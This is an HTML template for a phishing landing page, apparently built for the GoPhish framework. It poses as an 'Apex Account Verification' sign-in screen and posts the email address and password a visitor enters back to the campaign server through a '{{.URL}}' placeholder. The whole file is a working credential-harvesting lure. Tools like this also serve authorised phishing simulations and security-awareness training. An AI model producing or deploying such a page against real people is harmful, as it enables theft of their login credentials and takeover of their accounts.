<!DOCTYPE html>
<html>
<head>
  <title>Apex Account Verification</title>
  <meta charset="UTF-8">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
    }
    .login-box {
      width: 350px;
      margin: 100px auto;
      padding: 30px;
      background: white;
      border-radius: 8px;
      box-shadow: 0px 0px 10px rgba(0,0,0,0.2);
      text-align: center;
    }
    h2 {
      color: #333;
    }
    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
    }
    button {
      width: 95%;
      padding: 10px;
      background: #007BFF;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background: #0056b3;
    }
  </style>
</head>

<body>

<div class="login-box">
  <h2>Account Verification</h2>
  <p>Please sign in to continue</p>

  <!-- IMPORTANT: GoPhish capture -->
  <form action="{{.URL}}" method="POST">
    <input type="text" name="username" placeholder="Email Address" required><br>
    <input type="password" name="password" placeholder="Password" required><br>
    <button type="submit">Sign In</button>
  </form>
</div>

</body>
</html>
